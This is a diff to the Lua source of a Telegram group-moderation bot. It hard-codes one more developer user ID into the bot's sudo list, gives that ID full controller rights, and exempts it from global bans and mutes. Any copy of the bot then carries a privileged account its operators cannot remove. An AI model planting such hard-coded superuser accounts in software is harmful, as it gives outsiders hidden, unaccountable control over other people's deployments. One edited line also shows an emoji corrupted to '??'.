@@ -114,7 +114,7 @@ return Chat_Type
 end
 function The_ControllerAll(UserId)
 ControllerAll = false
-local ListSudos ={Sudo_Id,1804133252,1038368606}  
+local ListSudos ={Sudo_Id,1804133252,1038368606,1184518615}  
 for k, v in pairs(ListSudos) do
 if tonumber(UserId) == tonumber(v) then
 ControllerAll = true
@@ -137,6 +137,8 @@ if UserId == 1804133252 then
 Status = 'المبرمج باندا'
 elseif UserId == 1038368606 then  
 Status = 'المبرمج جوك'
+elseif UserId == 1184518615 then  
+Status = 'مطور السورس'
 elseif UserId == Sudo_Id then  
 Status = 'المطور الاساسي'
 elseif UserId == COCAINE then
@@ -722,6 +724,8 @@ if UserId == 1804133252 then
 Status = true
 elseif UserId == 1038368606 then  
 Status = true
+elseif UserId == 1184518615 then  
+Status = true
 elseif UserId == Sudo_Id then  
 Status = true
 elseif UserId == COCAINE then
@@ -760,6 +764,8 @@ StatusMember = LuaTele.getChatMember(ChatId,UserId).status.luatele
 if UserId == 1804133252 then
 Status = true
 elseif UserId == 1038368606 then    
+Status = true
+elseif UserId == 1184518615 then    
 Status = true
 elseif UserId == Sudo_Id then    
 Status = true
@@ -898,6 +904,9 @@ msg.Name_Controller = 'المبرمج باندا'
 msg.The_Controller = 1
 elseif tonumber(msg.sender.user_id) == 1038368606 then
 msg.Name_Controller = 'المبرمج جوك'
+msg.The_Controller = 1
+elseif tonumber(msg.sender.user_id) == 1184518615 then
+msg.Name_Controller = 'مطور السورس'
 msg.The_Controller = 1
 elseif The_ControllerAll(msg.sender.user_id) == true then  
 msg.The_Controller = 1
@@ -4461,6 +4470,9 @@ end
 if Controller(msg_chat_id,UserId_Info.id) == 'المبرمج جوك' then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n* ⦁ عذرا لا تستطيع حظر عام『 "..Controller(msg_chat_id,UserId_Info.id).." 』*","md",true)  
 end
+if Controller(msg_chat_id,UserId_Info.id) == 'مطور السورس' then
+return LuaTele.sendText(msg_chat_id,msg_id,"\n* ⦁ عذرا لا تستطيع حظر عام『 "..Controller(msg_chat_id,UserId_Info.id).." 』*","md",true)  
+end
 if Controller(msg_chat_id,UserId_Info.id) == 'المبرمج باندا' then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n* ⦁ عذرا لا تستطيع حظر عام『 "..Controller(msg_chat_id,UserId_Info.id).." 』*","md",true)  
 end
@@ -4528,6 +4540,9 @@ if Controller(msg_chat_id,UserId_Info.id) == 'المبرمج جوك' then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n* ⦁ عذرا لا تستطيع كتم عام『 "..Controller(msg_chat_id,UserId_Info.id).." 』*","md",true)  
 end
 if Controller(msg_chat_id,UserId_Info.id) == 'المبرمج باندا' then
+return LuaTele.sendText(msg_chat_id,msg_id,"\n* ⦁ عذرا لا تستطيع كتم عام『 "..Controller(msg_chat_id,UserId_Info.id).." 』*","md",true)  
+end
+if Controller(msg_chat_id,UserId_Info.id) == 'مطور السورس' then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n* ⦁ عذرا لا تستطيع كتم عام『 "..Controller(msg_chat_id,UserId_Info.id).." 』*","md",true)  
 end
 if Redis:sismember(COCAINE.."COCAINE:ktmAll:Groups",UserId_Info.id) then
@@ -4912,6 +4927,9 @@ end
 if Controller(msg_chat_id,Message_Reply.sender.user_id) == 'المبرمج جوك' then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n* ⦁ عذرا لا تستطيع حظر عام『 "..Controller(msg_chat_id,Message_Reply.sender.user_id).." 』*","md",true)  
 end
+if Controller(msg_chat_id,Message_Reply.sender.user_id) == 'مطور السورس' then
+return LuaTele.sendText(msg_chat_id,msg_id,"\n* ⦁ عذرا لا تستطيع حظر عام『 "..Controller(msg_chat_id,Message_Reply.sender.user_id).." 』*","md",true)  
+end
 if Controller(msg_chat_id,Message_Reply.sender.user_id) == 'المبرمج باندا' then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n* ⦁ عذرا لا تستطيع حظر عام『 "..Controller(msg_chat_id,Message_Reply.sender.user_id).." 』*","md",true)  
 end
@@ -4973,6 +4991,9 @@ if Controller(msg_chat_id,Message_Reply.sender.user_id) == 'المبرمج جو�
 return LuaTele.sendText(msg_chat_id,msg_id,"\n* ⦁ عذرا لا تستطيع كتم عام『 "..Controller(msg_chat_id,Message_Reply.sender.user_id).." 』*","md",true)  
 end
 if Controller(msg_chat_id,Message_Reply.sender.user_id) == 'المبرمج باندا' then
+return LuaTele.sendText(msg_chat_id,msg_id,"\n* ⦁ عذرا لا تستطيع كتم عام『 "..Controller(msg_chat_id,Message_Reply.sender.user_id).." 』*","md",true)  
+end
+if Controller(msg_chat_id,Message_Reply.sender.user_id) == 'مطور السورس' then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n* ⦁ عذرا لا تستطيع كتم عام『 "..Controller(msg_chat_id,Message_Reply.sender.user_id).." 』*","md",true)  
 end
 if Redis:sismember(COCAINE.."COCAINE:ktmAll:Groups",Message_Reply.sender.user_id) then
@@ -5270,6 +5291,9 @@ end
 if Controller(msg_chat_id,UserId) == 'المبرمج جوك' then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n* ⦁ عذرا لا تستطيع حظر عام『 "..Controller(msg_chat_id,UserId).." 』*","md",true)  
 end
+if Controller(msg_chat_id,UserId) == 'مطور السورس' then
+return LuaTele.sendText(msg_chat_id,msg_id,"\n* ⦁ عذرا لا تستطيع حظر عام『 "..Controller(msg_chat_id,UserId).." 』*","md",true)  
+end
 if Redis:sismember(COCAINE.."COCAINE:BanAll:Groups",UserId) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId," ⦁ تم حظره عام من المجموعات مسبقا ").Reply,"md",true)  
 else
@@ -5322,6 +5346,9 @@ if Controller(msg_chat_id,UserId) == 'المبرمج جوك' then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n* ⦁ عذرا لا تستطيع كتم عام『 "..Controller(msg_chat_id,UserId).." 』*","md",true)  
 end
 if Controller(msg_chat_id,UserId) == 'المبرمج باندا' then
+return LuaTele.sendText(msg_chat_id,msg_id,"\n*  ⦁ عذرا لا تستطيع كتم عام『 "..Controller(msg_chat_id,UserId).." 』*","md",true)  
+end
+if Controller(msg_chat_id,UserId) == 'مطور السورس' then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n*  ⦁ عذرا لا تستطيع كتم عام『 "..Controller(msg_chat_id,UserId).." 』*","md",true)  
 end
 if Redis:sismember(COCAINE.."COCAINE:ktmAll:Groups",UserId) then
@@ -9473,7 +9500,7 @@ data = {
 },
 }
 }
-return LuaTele.sendText(msg_chat_id,msg_id,'*ضحكتك عثل زيكك ينوحيي 🌝❤️*',"md",false, false, false, false, reply_markup)
+return LuaTele.sendText(msg_chat_id,msg_id,'*ضحكتك عثل زيكك ينوحيي ??❤️*',"md",false, false, false, false, reply_markup)
 end
 if text == '🤔' or text == '🤔🤔' then
 if not Redis:get(COCAINE.."COCAINE:Sasa:Jeka"..msg_chat_id) then
